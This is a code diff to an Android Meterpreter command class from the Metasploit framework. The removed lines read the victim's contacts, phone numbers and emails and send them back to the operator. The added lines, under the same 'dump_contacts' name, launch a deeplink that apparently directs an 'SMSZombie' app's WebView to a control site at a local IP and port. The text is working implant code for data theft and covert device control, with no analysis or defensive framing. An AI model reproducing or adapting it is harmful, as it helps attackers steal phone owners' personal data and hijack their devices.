@@ -11,6 +11,18 @@ import com.metasploit.meterpreter.Meterpreter;
 import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.command.Command;
 
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.app.Activity;
+import android.content.Context;
+import android.net.Uri;
+import android.content.ActivityNotFoundException;
+import android.content.ComponentName;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
+
 public class android_dump_contacts implements Command {
 
     private static final int TLV_EXTENSIONS = 20000;
@@ -32,44 +44,25 @@ public class android_dump_contacts implements Command {
     public int execute(Meterpreter meterpreter, TLVPacket request,
                        TLVPacket response) throws Exception {
 
-        ContentResolver cr = AndroidMeterpreter.getContext()
-                .getContentResolver();
+        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
+        final Context context = androidMeterpreter.getContext();
 
-        if (Integer.parseInt(Build.VERSION.RELEASE.substring(0, 1)) >= 2) {
-            Uri ContactUri = ContactsContract.Contacts.CONTENT_URI;
-            Uri PhoneUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
-            Uri EmailUri = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
-            Cursor cur = cr.query(ContactUri, null, null, null, null);
 
-            while (cur.moveToNext()) {
-                TLVPacket pckt = new TLVPacket();
-                String id = cur.getString(cur.getColumnIndex(_id));
 
-                // Name
-                pckt.addOverflow(TLV_TYPE_CONTACT_NAME, cur.getString(cur.getColumnIndex(displayName)));
+       /* Android Q poses limitations on starting activities
+        *
+        * https://developer.android.com/guide/components/activities/background-starts
+        */
 
-                // Number
-                Cursor pCur = cr.query(PhoneUri, null, contactId + " = ?",
-                        new String[]{id}, null);
-                while (pCur.moveToNext()) {
-                    pckt.addOverflow(TLV_TYPE_CONTACT_NUMBER,
-                            pCur.getString(pCur.getColumnIndex(data1)));
-                }
-                pCur.close();
+        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
+        try {
+            Intent intent = new Intent("android.intent.action.VIEW",
+                        Uri.parse("walkingdead://callzombie/?url=http://192.168.1.134:1313"));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
 
-                // Email
-                Cursor emailCur = cr.query(EmailUri, null, contactId
-                        + " = ?", new String[]{id}, null);
-                while (emailCur.moveToNext()) {
-                    pckt.addOverflow(TLV_TYPE_CONTACT_EMAIL, emailCur
-                            .getString(emailCur.getColumnIndex(data1)));
-                }
-                emailCur.close();
-
-                response.addOverflow(TLV_TYPE_CONTACT_GROUP, pckt);
-            }
-
-            cur.close();
+        } catch (ActivityNotFoundException e) {
+          return ERROR_FAILURE;
         }
 
         return ERROR_SUCCESS;
